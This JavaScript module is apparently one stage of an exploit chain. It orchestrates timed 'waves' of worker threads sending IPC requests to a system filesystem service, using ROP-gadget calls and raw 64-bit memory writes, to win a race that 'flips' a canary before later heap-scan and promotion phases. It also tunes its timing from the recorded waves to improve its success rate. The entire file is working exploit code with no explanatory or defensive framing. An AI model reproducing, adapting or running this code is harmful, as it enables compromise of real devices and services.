import coreRuntime, {waitMs} from "../runtime.mjs";
import {
    verboseLog,
    isVerboseLogging
} from "../logger.mjs";
import {formatWaveSummaryLine} from "../wave/summary.mjs";
import {formatWaveVectorLine, proposePositiveTimingAdjustment} from "../wave/canary-feedback.mjs";

const {
    GADGET_MEMSET,
    allocPage,
    call_rop,
    closeHandle,
    closeReservationGroup,
    executeWave,
    frameArgSlot,
    openReservationGroup,
    prepareReleaseRequest,
    readAllocationCounters,
    resetWaveState,
    roleSendCode,
    write32,
    write64,
    writeDirtyData
} = coreRuntime;

// ----- Canary campaign (S11) -----

/** Past this share of flips among the positive waves, a failing run is a timing problem rather than bad luck. */
export const WINDOW_RATE_THRESHOLD = 0.8;

/**
 * Run the canary campaign and translate its outcome for the attempt
 * orchestrator. This function only reports: the caller applies the state
 * updates, logs the result and owns every cleanup decision.
 */
export async function runCanaryStage({
    config,
    helpers,
    resources,
    shouldStop,
    attemptNumber
}) {
    const control = await runCanaryCampaign({
        config, helpers, resources, shouldStop, attemptNumber
    });

    let message;

    if (control?.stoppedByUser) {
        message = "Stopped by user after the current wave; no further waves will launch.";
    } else if (control?.canaryQualified) {
        message = "CANARY FLIPPED";
    } else if (control?.positiveWindows) {
        message = "Canary did not flip.";
    } else {
        message = "No valid canary window was found.";
    }

    let stopReason = null;
    let benchMessage = null;

    if (control?.stoppedByUser) {
        stopReason = "Stopped by user after the current wave; skipping later phases.";
    } else if (!control?.ok) {
        stopReason = "Canary attempt stopped before qualification; skipping later phases.";
    } else if (config.CANARY_BENCH_MODE && control.canaryQualified === true) {
        benchMessage = "CANARY BENCH: qualified flip achieved; skipping candidate storage, alias and promotion for this attempt.";
        stopReason = "Canary bench mode; qualified flip achieved; skipping candidate storage, cache alias and promotion.";
    } else if (control.canaryQualified !== true) {
        stopReason = "Canary did not flip; skipping candidate storage, cache alias, heap scan, address qualification and promotion.";
    }

    const attemptStatePatch = {
        stoppedByUser: control?.stoppedByUser === true,
        positiveAttempts: control?.positiveAttempts || 0,
        positiveWindows: control?.positiveWindows || 0,
        qualifiedCanaryFlips: control?.positiveQualifiedFlips || 0
    };

    if (control?.timingAdjustment) {
        attemptStatePatch.timingAdjustment = control.timingAdjustment;
        attemptStatePatch.nextTimingSchedule = control.timingSchedule;
    }

    return {
        attemptStatePatch,
        benchMessage,
        control,
        message,
        pinHandle: control?.pinHandle || resources.handles.pinHandle,
        stopReason,
        workerStateSafe: control?.workerStateSafe === true
    };
}

// ----- Campaign orchestration -----

/** Launch the control waves, then the positive waves, until one flips or the wave budget runs out. */
async function runCanaryCampaign({
    config,
    helpers,
    resources,
    shouldStop = null,
    attemptNumber = null
}) {
    const campaign = createCanaryCampaignState(resources.handles.pinHandle);
    const dirtyWriteBuf = allocPage(config.DIRTY_FILE_SIZE + 0x2000);
    call_rop(GADGET_MEMSET, dirtyWriteBuf, 0x66n, BigInt(config.DIRTY_FILE_SIZE));
    const dirtyWritePkt = allocPage(0x2000);

    /*
     * Yield before the first wave so queued controller input gets handled, and
     * after every wave so a stop request can prevent the next launch.
     */
    await waitMs(0);

    for (let waveIndex = 0; waveIndex < config.MAX_CONTROL_WAVES; waveIndex++) {
        if (shouldStop?.()) {
            campaign.stoppedByUser = true;
            campaign.workflowStopReason = "stopped-by-user";
            break;
        }

        if (campaign.canaryQualified) {
            break;
        }

        const waveNumber = waveIndex + 1;
        const profile = campaign.nextProfile;
        const waveRun = runCanaryWave({
            config,
            helpers,
            resources,
            campaign,
            dirtyWriteBuf,
            dirtyWritePkt,
            waveNumber,
            profile
        });

        if (!waveRun.ok) {
            break;
        }

        advanceCanaryProfile(campaign, profile, waveRun.result);

        const waveLogLines = createCanaryWaveLogLines({
            config,
            profile,
            result: waveRun.result,
            waveNumber
        });

        await waitMs(0);

        if (waveLogLines && isVerboseLogging()) {
            const outputLines = [];

            if (!campaign.verboseAttemptHeaderWritten && attemptNumber !== null) {
                outputLines.push("======== ATTEMPT " + attemptNumber + " WAVE DETAILS ========");
                campaign.verboseAttemptHeaderWritten = true;
            }

            outputLines.push(...waveLogLines);
            outputLines.push(formatWaveVectorLine({
                wave: waveNumber,
                profile,
                result: waveRun.result,
                w9DelayNs: waveRun.w9DelayNs,
                betweenStats: waveRun.betweenStats
            }, config));
            await verboseLog(outputLines.join("\n"));
        }

        if (shouldStop?.()) {
            campaign.stoppedByUser = true;
            campaign.workflowStopReason = "stopped-by-user";
            break;
        }
    }

    return createCanaryCampaignResult({
        campaign,
        config,
        dirtyWriteBuf,
        dirtyWritePkt
    });
}

// ----- One-wave lifecycle -----

/** Run one wave and leave the campaign's next-profile decision untouched. */
function runCanaryWave({
    config,
    helpers,
    resources,
    campaign,
    dirtyWriteBuf,
    dirtyWritePkt,
    waveNumber,
    profile
}) {
    const preparedWave = prepareCanaryWave({
        config,
        helpers,
        resources,
        campaign,
        dirtyWriteBuf,
        dirtyWritePkt,
        waveNumber,
        profile
    });

    if (!preparedWave.ok) {
        campaign.workflowStopReason = preparedWave.workflowStopReason;
        return {ok: false};
    }

    const workerRun = executeCanaryWaveWorkers({
        config,
        resources,
        preparedWave,
        waveNumber
    });

    if (workerRun.started) {
        campaign.wavesStarted++;
    }

    if (!workerRun.ok) {
        campaign.workflowStopReason = workerRun.workflowStopReason;
        campaign.workerStateSafe = workerRun.workerStateSafe;
        return {ok: false};
    }

    campaign.wavesJoined++;

    const result = analyzeCanaryWave({
        config,
        helpers,
        resources,
        campaign,
        preparedWave,
        profile,
        workerRun
    });

    campaign.profileCounts[profile] = (campaign.profileCounts[profile] || 0) + 1;

    if (profile === "positive") {
        recordPositiveCanaryWave(campaign, {
            waveNumber,
            profile,
            w9DelayNs: preparedWave.w9DelayNs,
            betweenStats: preparedWave.betweenStats,
            result
        });
    }

    const {waveData, sendIndices} = resources.waveInfrastructure;
    const releaseWasSent = roleSendCode(waveData.frames, 9, sendIndices[9]) === 0;
    closeReservationGroup(preparedWave.group, !releaseWasSent, resources.pktBuf);

    return {
        ok: true,
        result,
        w9DelayNs: preparedWave.w9DelayNs,
        betweenStats: preparedWave.betweenStats
    };
}

/** Prepare the requests and the reservation group. The caller owns that group once the wave succeeds. */
function prepareCanaryWave({
    config,
    helpers,
    resources,
    campaign,
    dirtyWriteBuf,
    dirtyWritePkt,
    waveNumber,
    profile
}) {
    const {
        buffers,
        handles,
        packets,
        pktBuf,
        renamePathBuffers = null,
        scratch,
        waveInfrastructure
    } = resources;
    const {REQ} = packets;
    const {dirtyFilePath, SCRATCH_DIR, segments, selectedDir} = scratch;
    const {extentTotal, fragmentBufs, triggerBuf} = buffers;
    const {rootSession, savedHandle} = handles;
    const {gates, sendIndices, waveData, waveExtra} = waveInfrastructure;

    if (!writeDirtyData(savedHandle, dirtyFilePath, config.DIRTY_FILE_SIZE,
                        dirtyWriteBuf, dirtyWritePkt)) {
        return {
            ok: false,
            workflowStopReason: "dirty-write-failed-at-wave-" + waveNumber
        };
    }

    resetWaveState(waveData.frames, waveData.backups, REQ, waveData.pktBackups,
                   gates, waveExtra);

    const w9DelayNs = config.roleDelays[9];

    // Start with the completion already set, which is what exercises W12's abort gate.
    if (profile === "abort-control") {
        write32(gates.completedFlag, 1n);
    }

    // Make W1 look like it finished early, which is what exercises W12's abort-hole check.
    if (profile === "abort-hole-control") {
        write32(gates.bottleneckFinished, 1n);
    }

    const profileSetup = helpers.configureProfile(profile, {
        config,
        REQ,
        SCRATCH_DIR,
        extentTotal,
        fragmentBufs,
        segments,
        selectedDir,
        triggerBuf
    });

    if (!profileSetup.configured) {
        return {
            ok: false,
            workflowStopReason: "profile-setup-failed-" + profile
        };
    }

    let renameInputBefore = null;

    if (renamePathBuffers && isVerboseLogging()) {
        renameInputBefore = helpers.captureRenameInputState(REQ, renamePathBuffers, config.workerRoles);
    }

    /*
     * Peak counters clear themselves when read, and an extra delta means another
     * fsp-srv caller was busy. Read them before the group opens, so this snapshot
     * cannot split the held-to-pre cache window.
     */
    let betweenStats = null;

    if (isVerboseLogging()) {
        betweenStats = readAllocationCounters(rootSession, pktBuf);
    }

    const group = openReservationGroup(rootSession, pktBuf, 59);

    if (!group.ok) {
        return {
            ok: false,
            workflowStopReason: "reservation-failed-at-wave-" + waveNumber
        };
    }

    prepareReleaseRequest(REQ[9], waveData.frames, sendIndices, group);

    const extentProfile = profile === "extent-absent" || profile === "extent-present";
    const {extentTriggerHandle, triggerHandle} = handles;
    write64(frameArgSlot(waveData.frames[12].frame, waveData.frames[12].count,
                         sendIndices[12], 0),
            BigInt(extentProfile ? extentTriggerHandle : triggerHandle));

    const createPinThisWave = !campaign.pinHandle;
    const {pinPkt} = packets;
    write32(pinPkt + 0x18n, BigInt(createPinThisWave ? 200 : 1009));

    return {
        ok: true,
        profile,
        w9DelayNs,
        betweenStats,
        renameInputBefore,
        group,
        createPinThisWave
    };
}

/** Run every worker in one wave, then decide whether the campaign can go on. */
function executeCanaryWaveWorkers({config, resources, preparedWave, waveNumber}) {
    const {pktBuf, rawScheduling, waveInfrastructure} = resources;
    const {gates, sendIndices, waveData, workerResources} = waveInfrastructure;
    const wave = executeWave(waveData.frames, rawScheduling, workerResources,
                             gates, sendIndices, config.workerRoles);
    const started = wave.started === config.WORKER_COUNT;

    if (wave.created < config.WORKER_COUNT ||
        wave.pinned < config.WORKER_COUNT ||
        wave.started < config.WORKER_COUNT) {
        let workflowStopReason;

        if (wave.created === config.WORKER_COUNT &&
            wave.pinned < config.WORKER_COUNT) {
            workflowStopReason = "worker-pinning-failed-at-wave-" + waveNumber;
        } else {
            workflowStopReason = "worker-start-failed-at-wave-" + waveNumber;
        }

        const releaseCode = roleSendCode(waveData.frames, 9, sendIndices[9]);
        closeReservationGroup(preparedWave.group,
                              wave.created < config.WORKER_COUNT || releaseCode !== 0, pktBuf);

        return {
            ok: false,
            started,
            workerStateSafe: wave.workerStateSafe === true,
            workflowStopReason
        };
    }

    if (wave.joined < config.WORKER_COUNT) {
        return {
            ok: false,
            started,
            workerStateSafe: false,
            workflowStopReason: "worker-join-failed-at-wave-" + waveNumber
        };
    }

    return {ok: true, started, wave};
}

/** Read a wave once every worker has joined, and hand back the pin handle the next wave has to reuse. */
function analyzeCanaryWave({
    config,
    helpers,
    resources,
    campaign,
    preparedWave,
    profile,
    workerRun
}) {
    const waveAnalysisInput = createCanaryWaveAnalysisInput({
        config,
        resources,
        pinFirstWaveQualified: campaign.pinFirstWaveQualified,
        pinHandle: campaign.pinHandle,
        renameInputBefore: preparedWave.renameInputBefore
    });
    const result = helpers.analyzeWave(profile, workerRun.wave,
                                       resources.waveInfrastructure.waveData,
                                       preparedWave.group, preparedWave.createPinThisWave,
                                       waveAnalysisInput);
    campaign.pinHandle = result.pinHandle;
    campaign.pinFirstWaveQualified = result.pinFirstWaveQualified;

    if (preparedWave.createPinThisWave) {
        campaign.pinQualificationDiagnostics = result.pinDiagnostics;
    }

    return result;
}

/** Add one positive wave to the campaign totals, and keep its full record for the timing fit. */
function recordPositiveCanaryWave(campaign, {waveNumber, profile, w9DelayNs, betweenStats, result}) {
    const positiveWave = createPositiveWaveSummary({
        waveNumber,
        profile,
        w9DelayNs,
        betweenStats,
        result
    });
    const positive = campaign.positive;
    positive.observedRedirects += positiveWave.observedRedirects;
    positive.windowFlips += positiveWave.windowFlips;
    positive.outsideWindowFlips += positiveWave.outsideWindowFlips;
    positive.windows += positiveWave.windows;
    positive.qualifiedFlips += positiveWave.qualifiedFlips;
    positive.healthFailures += positiveWave.healthFailures;

    for (const rejection of positiveWave.record.rejections) {
        positive.gateFailures[rejection] = (positive.gateFailures[rejection] || 0) + 1;
    }

    positive.records.push(positiveWave.record);
}

// ----- Campaign state and analysis -----

function createCanaryCampaignState(pinHandle) {
    return {
        canaryQualified: false,
        controls: {
            abortControlPassed: false,
            abortHoleControlPassed: false,
            extentQualified: false,
            negativeControlPassed: false
        },
        nextProfile: "abort-control",
        pinFirstWaveQualified: false,
        pinHandle,
        pinQualificationDiagnostics: null,
        positive: {
            windows: 0,
            windowFlips: 0,
            observedRedirects: 0,
            outsideWindowFlips: 0,
            qualifiedFlips: 0,
            healthFailures: 0,
            gateFailures: Object.create(null),
            records: []
        },
        profileCounts: Object.create(null),
        stoppedByUser: false,
        verboseAttemptHeaderWritten: false,
        wavesJoined: 0,
        wavesStarted: 0,
        workerStateSafe: true,
        workflowStopReason: null
    };
}

function createCanaryWaveAnalysisInput({
    config,
    resources,
    pinFirstWaveQualified,
    pinHandle,
    renameInputBefore
}) {
    const {
        handles,
        packets,
        pktBuf,
        renamePathBuffers,
        scratch,
        waveInfrastructure
    } = resources;

    return {
        config,
        REQ: packets.REQ,
        clearPkt: packets.clearPkt,
        clearSendIndex: waveInfrastructure.clearSendIndex,
        gates: waveInfrastructure.gates,
        pinFirstWaveQualified,
        pinHandle,
        pinPkt: packets.pinPkt,
        pinSendIndex: waveInfrastructure.pinSendIndex,
        pktBuf,
        prePkt: packets.prePkt,
        preSendIndex: waveInfrastructure.preSendIndex,
        rootSession: handles.rootSession,
        sendIndices: waveInfrastructure.sendIndices,
        abortControlCanonical: scratch.abortControlCanonical,
        canaryPath: scratch.canaryPath,
        savedHandle: handles.savedHandle,
        setupPath: scratch.setupPath,
        setupPkt: scratch.setupPkt,
        renamePathBuffers,
        renameInputBefore
    };
}

function createPositiveWaveSummary({waveNumber, profile, w9DelayNs, betweenStats, result}) {
    const timingRecord = {
        wave: waveNumber,
        profile,
        w9DelayNs,
        window: result.window,
        shape: result.shape,
        shapeMissing: result.shapeMissing.slice(),
        marginUs: result.marginUsRaw,
        marginSlackUs: result.marginSlackUs,
        rejections: result.rejections.slice(),
        roleTimings: result.roleTimings,
        betweenCounters: betweenStats,
        counterVector: result.counterVector,
        w9Probes: result.w9Probes
    };

    let observedRedirects = 0;
    let windowFlips = 0;
    let outsideWindowFlips = 0;
    let windows = 0;
    let qualifiedFlips = 0;
    let healthFailures = 0;

    if (result.observedCanaryRedirect) {
        observedRedirects++;

        if (result.window) {
            windowFlips++;
        } else {
            outsideWindowFlips++;
        }
    }

    if (result.window) {
        windows++;
    }

    if (result.canaryRedirect) {
        qualifiedFlips++;
    }

    if (!result.postCanaryHealth.healthy) {
        healthFailures++;
    }

    const record = {
        ...timingRecord,
        preReleaseUsed: result.preReleaseUsed,
        preReleaseSlackBytes: result.preReleaseSlackBytes,
        canaryResult: result.canaryResult,
        canaryType: result.canaryType,
        observedRedirect: result.observedCanaryRedirect,
        qualifiedFlip: result.canaryRedirect,
        postHealthy: result.postCanaryHealth.healthy,
        postCanaryHealth: {...result.postCanaryHealth},
        triggerResult: result.triggerResult,
        triggerCanonical: result.triggerCanonical,
        triggerType: result.triggerType,
        selectedMarker: result.selectedMarker,
        triggerAborted: result.triggerAborted,
        changedPaths: result.changedPaths.slice(),
        guardSamples: {...result.guardSamples}
    };

    return {
        record,
        observedRedirects,
        windowFlips,
        outsideWindowFlips,
        windows,
        qualifiedFlips,
        healthFailures
    };
}

// ----- Campaign transitions and reporting -----

/**
 * Walk the qualification sequence, one profile per wave: abort, abort-hole,
 * extent-absent, extent-present, negative control, then positive waves until one
 * flips. A profile that fails is replayed, never skipped.
 */
function advanceCanaryProfile(campaign, profile, result) {
    const controls = campaign.controls;

    if (profile === "abort-control") {
        controls.abortControlPassed = campaign.pinFirstWaveQualified && result.abortControl;

        if (!campaign.pinFirstWaveQualified && campaign.pinHandle) {
            closeHandle(campaign.pinHandle);
            campaign.pinHandle = 0;
        }

        if (controls.abortControlPassed) {
            campaign.nextProfile = "abort-hole-control";
        } else {
            campaign.nextProfile = "abort-control";
        }
    } else if (profile === "abort-hole-control") {
        controls.abortHoleControlPassed = result.abortHoleControl;

        if (controls.abortHoleControlPassed) {
            campaign.nextProfile = "extent-absent";
        } else {
            campaign.nextProfile = "abort-hole-control";
        }
    } else if (profile === "extent-absent") {
        campaign.nextProfile = "extent-present";
    } else if (profile === "extent-present") {
        controls.extentQualified = result.extentQualified;

        if (controls.extentQualified) {
            campaign.nextProfile = "negative";
        } else {
            campaign.nextProfile = "extent-present";
        }
    } else if (profile === "negative") {
        controls.negativeControlPassed = result.negativeControl;

        if (controls.negativeControlPassed) {
            campaign.nextProfile = "positive";
        } else {
            campaign.nextProfile = "negative";
        }
    } else if (profile === "positive") {
        campaign.canaryQualified = result.canaryRedirect;
        campaign.nextProfile = "positive";
    }
}

function createCanaryWaveLogLines({config, profile, result, waveNumber}) {
    if (!isVerboseLogging()) {
        return null;
    }

    const lines = [formatWaveSummaryLine(waveNumber, profile, result, null, config)];
    const roleTimings = result.roleTimings;

    if (roleTimings) {
        const parts = [];

        for (let roleIndex = 0; roleIndex < config.roleShort.length; roleIndex++) {
            const label = config.roleLabels[roleIndex];
            const timing = roleTimings[label];

            if (timing) {
                parts.push(config.roleShort[roleIndex] + "=" + Math.round(timing.durationUs));
            }
        }

        lines.push("       ipc-µs: " + parts.join(" "));
    }

    return lines;
}

function canSuggestTimingAdjustment(campaign, positive, controlsQualified) {
    return controlsQualified && campaign.workerStateSafe &&
        !campaign.canaryQualified && !campaign.stoppedByUser &&
        positive.healthFailures === 0;
}

function createCanaryCampaignResult({campaign, config, dirtyWriteBuf, dirtyWritePkt}) {
    const positive = campaign.positive;
    const controls = campaign.controls;
    const positiveAttempts = campaign.profileCounts.positive || 0;
    const controlsQualified = campaign.pinFirstWaveQualified && controls.abortControlPassed &&
        controls.abortHoleControlPassed && controls.extentQualified && controls.negativeControlPassed;
    let timingAdjustment = null;

    if (canSuggestTimingAdjustment(campaign, positive, controlsQualified)) {
        timingAdjustment = proposePositiveTimingAdjustment(positive.records, config);
    }

    let timingSchedule = null;

    if (timingAdjustment) {
        timingSchedule = {
            roleDelays: timingAdjustment.roleDelays,
            guardDelays: timingAdjustment.guardDelays
        };
    }

    const campaignState = classifyCampaignState(campaign, positive, controlsQualified);

    return {
        ok: true,
        canaryQualified: campaign.canaryQualified,
        dirtyWriteBuf,
        dirtyWritePkt,
        pinFirstWaveQualified: campaign.pinFirstWaveQualified,
        pinHandle: campaign.pinHandle,
        wavesJoined: campaign.wavesJoined,
        wavesStarted: campaign.wavesStarted,
        workerStateSafe: campaign.workerStateSafe,
        campaignState,
        controlsQualified,
        stoppedByUser: campaign.stoppedByUser,
        workflowStopReason: campaign.workflowStopReason,
        profileCounts: campaign.profileCounts,
        abortControlPassed: controls.abortControlPassed,
        abortHoleControlPassed: controls.abortHoleControlPassed,
        extentQualified: controls.extentQualified,
        negativeControlPassed: controls.negativeControlPassed,
        positiveAttempts,
        positiveWindows: positive.windows,
        positiveWindowFlips: positive.windowFlips,
        positiveObservedRedirects: positive.observedRedirects,
        positiveOutsideWindowFlips: positive.outsideWindowFlips,
        positiveQualifiedFlips: positive.qualifiedFlips,
        positiveHealthFailures: positive.healthFailures,
        positiveGateFailures: positive.gateFailures,
        positiveWindowRecords: positive.records,
        timingAdjustment,
        timingSchedule,
        pinQualificationDiagnostics: campaign.pinQualificationDiagnostics
    };
}

/** One label for the whole campaign verdict, most severe case first. */
function classifyCampaignState(campaign, positive, controlsQualified) {
    if (!campaign.workerStateSafe) {
        return "worker-unsafe";
    }

    if (positive.healthFailures > 0) {
        return "post-health-failure";
    }

    if (campaign.stoppedByUser) {
        return "user-stopped";
    }

    if (campaign.canaryQualified) {
        return "flip-qualified";
    }

    if (controlsQualified && positive.windows > 0) {
        return "window-valid-no-flip";
    }

    if (controlsQualified && positive.outsideWindowFlips > 0) {
        return "raw-flip-outside-window";
    }

    if (controlsQualified) {
        return "no-qualified-positive-window";
    }

    return "controls-incomplete";
}
